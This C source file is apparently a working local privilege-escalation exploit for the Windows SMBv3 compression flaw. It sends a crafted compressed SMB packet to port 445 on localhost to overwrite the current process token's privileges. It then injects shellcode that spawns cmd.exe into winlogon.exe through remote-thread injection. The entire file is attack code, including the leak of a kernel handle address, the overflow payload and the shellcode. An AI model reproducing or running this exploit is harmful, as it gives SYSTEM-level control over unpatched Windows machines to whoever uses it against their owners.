#include <stdio.h>
#include <stdint.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "ntoskrnl.h"
#include <psapi.h>
#pragma comment(lib,"ws2_32.lib") //Winsock Library
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma warning(disable:4996) 

void sendNegotiate(SOCKET s) {
	char buf[1024];
	// Just coppied from Wireshark
	char packet_bytes[] = {
		/*NetBIOS Session Servvice Stuff ... */
		0x00, 0x00, 0x00, 0xba, 0xfe, 0x53, 0x4d, 0x42,
		0x40, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0xff, 0xfe, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x01, 0x00,
		0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xd1, 0xc0, 0x5f, 0xb0, 0xdd, 0xb8, 0x94, 0x4f,
		0x80, 0xe0, 0x32, 0x55, 0x30, 0xc1, 0x5a, 0xd9,
		0x68, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00,
		0x11, 0x03, 0x00, 0x00, 0x01, 0x00, 0x26, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x20, 0x00,
		0x01, 0x00, 0x33, 0x33, 0xb7, 0x4b, 0xa2, 0xac,
		0x0d, 0xc7, 0x27, 0xeb, 0x9e, 0x76, 0x6c, 0xd3,
		0x25, 0xd8, 0x5d, 0x57, 0x96, 0xfd, 0x97, 0x36,
		0xfc, 0x4f, 0x40, 0x05, 0x09, 0x2b, 0xa9, 0x6e,
		0x35, 0x7d, 0x00, 0x00, 0x02, 0x00, 0x04, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x0a, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x02, 0x00
	};
	send(s, packet_bytes, sizeof(packet_bytes), 0);
	recv(s, buf, 1024, 0);
}
int findWinLogon(DWORD processID)
{
	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

	// Get a handle to the process.

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ,
		FALSE, processID);

	// Get the process name.

	if (NULL != hProcess)
	{
		HMODULE hMod;
		DWORD cbNeeded;

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
			&cbNeeded))
		{
			GetModuleBaseName(hProcess, hMod, szProcessName,
				sizeof(szProcessName) / sizeof(TCHAR));
		}
	}

	if (lstrcmpW(szProcessName, L"winlogon.exe")) {
		processID = -1;
	}
	CloseHandle(hProcess);
	return processID;
}


#define FULL_PRIV 16
#define SMB_HEADER_SIZE 16

void TriggerCrash(SOCKET s, int buflen, unsigned char* compress) {
	char buf[1024];
	unsigned char packet_bytes[] = {

		/*NetBIOS Session Service*/
		0x00, /* Message Type */
		0x00, 0x00, (buflen + FULL_PRIV + SMB_HEADER_SIZE), /* Length of SMB Packet* /

		/*SMB packet*/
		0xfc, 0x53, 0x4d, 0x42, // ProtocolID
		0xff, 0xff, 0xff, 0xff,// OriginalSize
		0x02, 0x00, // CompressionAlgorithm 
		0x00, 0x00, // Flags
		0x10, 0x00, 0x00, 0x00, // Offset

		/*FULL PRIV*/
		0xbc,0xff,0xff,0xf2,0x1f,0x00,0x00,0x00,
		0xbc,0xff,0xff,0xf2,0x1f,0x00,0x00,0x00
		/* Conpressed SMB Data Here */
	};
	int packet_sz = sizeof(packet_bytes);
	unsigned char* final_packet = (unsigned char*)malloc(buflen + packet_sz);

	memmove(final_packet, packet_bytes, packet_sz);
	memmove(final_packet + packet_sz, compress, buflen);

	send(s, (const char*)final_packet, buflen + packet_sz, 0);
	recv(s, buf, 1024, 0);
	uint8_t shellcode[] = {
		0x48, 0x81, 0xEC, 0x08, 0x02, 0x00, 0x00, 0x48, 0x31, 0xC9,
		0x65, 0x48, 0x8B, 0x41, 0x60, 0x48, 0x8B, 0x40, 0x18, 0x48,
		0x8B, 0x70, 0x20, 0x48, 0xAD, 0x48, 0x96, 0x48, 0xAD, 0x48,
		0x8B, 0x58, 0x20, 0x49, 0x89, 0xD8, 0x8B, 0x5B, 0x3C, 0x4C,
		0x01, 0xC3, 0x8B, 0x93, 0x88, 0x00, 0x00, 0x00, 0x4C, 0x01,
		0xC2, 0x44, 0x8B, 0x52, 0x14, 0x4D, 0x31, 0xDB, 0x44, 0x8B,
		0x5A, 0x20, 0x4D, 0x01, 0xC3, 0x4C, 0x89, 0xD1, 0x67, 0xE3,
		0x1C, 0x31, 0xDB, 0x41, 0x8B, 0x5C, 0x8B, 0x04, 0x4C, 0x01,
		0xC3, 0x48, 0xFF, 0xC9, 0x48, 0xB8, 0x57, 0x69, 0x6E, 0x45,
		0x78, 0x65, 0x63, 0x00, 0x48, 0x39, 0x03, 0x75, 0xE1, 0x4D,
		0x31, 0xDB, 0x44, 0x8B, 0x5A, 0x24, 0x4D, 0x01, 0xC3, 0x48,
		0xFF, 0xC1, 0x66, 0x45, 0x8B, 0x2C, 0x4B, 0x4D, 0x31, 0xDB,
		0x44, 0x8B, 0x5A, 0x1C, 0x4D, 0x01, 0xC3, 0x43, 0x8B, 0x44,
		0xAB, 0x04, 0x4C, 0x01, 0xC0, 0x49, 0x89, 0xC6, 0x48, 0x31,
		0xC0, 0x50, 0x48, 0xB8, 0x63, 0x6D, 0x64, 0x2E, 0x65, 0x78,
		0x65, 0x00, 0x50, 0x48, 0x89, 0xE1, 0x48, 0x31, 0xD2, 0x48,
		0xFF, 0xC2, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xFF, 0xD6
	};

	 

	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		return;
	}

	cProcesses = cbNeeded / sizeof(DWORD);


	for (i = 0; i < cProcesses; i++)
	{
		if (aProcesses[i] != 0&& findWinLogon(aProcesses[i])!=-1)
		{
			
			HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, aProcesses[i]);
			if (hProc == NULL) {
				printf("Could not open process\n");
				return;
			}

			LPVOID lpMem = VirtualAllocEx(hProc, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (lpMem == NULL) {
				printf("Remote allocation failed\n");
				return;
			}
			if (!WriteProcessMemory(hProc, lpMem, shellcode, sizeof(shellcode), 0)) {
				printf("Remote write failed\n");
				return;
			}
			if (!CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpMem, 0, 0, 0)) {
				printf("CreateRemoteThread failed\n");
				return;
			}
			return;
		}
	}

 
}


BOOL quick_compress(IN PVOID data, IN DWORD size, IN OUT UCHAR compressedData[1024], IN OUT PULONG FinalCompressedSize)
{
	ULONG CompressBufferWorkSpaceSize = 0;
	ULONG CompressFragmentWorkSpaceSize = 0;
	
	if (RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS, &CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize)  != STATUS_SUCCESS) {
		printf("RtlGetCompressionWorkSpaceSize() failed");
		return 0;
	}
 
	 
	LPVOID lpWorkSpace = malloc(CompressBufferWorkSpaceSize);
	 
	if (RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, PUCHAR(data), size, compressedData, 1024, 4096, FinalCompressedSize, lpWorkSpace) != STATUS_SUCCESS ) {
		printf("RtlCompressBuffer() failed");
		free(lpWorkSpace);
		return 0;
	}
	 
#if DEBUG
	PVOID pvOutputBuffer = malloc(strlen((const char*)data));
	ULONG finala = 0;
	RtlDecompressBuffer(COMPRESSION_FORMAT_XPRESS, (PUCHAR)pvOutputBuffer, strlen((const char*)data), compressedData, 1024, &finala);
	printf("%s", pvOutputBuffer);
#else
#endif
	
 
	
	free(lpWorkSpace);
	return 1;
}
ULONG64 get_handle_addr(HANDLE h) {
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
		status = NtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);

	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation() failed with error: %#x\n", status);
		return 1;
	}
	DWORD mypid = GetProcessId(GetCurrentProcess());
	ULONG64 ptrs[1000] = { 0 };
	for (int i = 0; i < pHandleInfo->NumberOfHandles; i++) {
		PVOID object = pHandleInfo->Handles[i].Object;
		ULONG_PTR handle = pHandleInfo->Handles[i].HandleValue;
		DWORD pid = (DWORD)pHandleInfo->Handles[i].UniqueProcessId;
		
		if (pid != mypid)
			continue;
		if (handle == (ULONG_PTR)h)
			return (ULONG64)object;
	}
	return -1;
}

ULONG64 get_process_token() {
	HANDLE token;
	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	if (proc == INVALID_HANDLE_VALUE)
		return 0;

	OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token);
	ULONG64 ktoken = get_handle_addr(token);

	return ktoken;
}
int main(int argc, char* argv[2])
{
	WSADATA wsa;
	SOCKET s;
 
	 
	printf("\nInitialising Winsock...");
	
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("Failed. Error Code : %d", WSAGetLastError());
		return 1;
	}

	printf("Initialised.\n");

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d", WSAGetLastError());
	}
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr("127.0.0.1");
	clientService.sin_port = htons(445);
	printf("Socket created.\n");

	int iResult = connect(s, (SOCKADDR*)&clientService, sizeof(clientService));
	if (iResult == SOCKET_ERROR) {
		wprintf(L"connect function failed with error: %ld\n", WSAGetLastError());
		iResult = closesocket(s);
		if (iResult == SOCKET_ERROR)
			wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	unsigned char* payload = (unsigned char*)malloc(0x1110);
	memset(payload, 'a', 0x1110-8);
	ULONG64 TOKEN_0X40 = get_process_token() + 0x40;
	*(ULONG64*)&payload[0x1110 - 8] = TOKEN_0X40;

	unsigned char compressed[1024];
	ZeroMemory(compressed, 1024);
	ULONG sizecompressed = 0;
	
	quick_compress(PVOID(payload), strlen((const char*)payload),compressed, (PDWORD)&sizecompressed);
#if DEBUG
	for (int i = 0; i < sizecompressed; i++) {
		printf("0x%x,", compressed[i]);
	}
#else
#endif

	sendNegotiate(s);
	TriggerCrash(s, sizecompressed, compressed);
	 
	iResult = closesocket(s);
	if (iResult == SOCKET_ERROR) {
		wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	WSACleanup();
	return 0;
}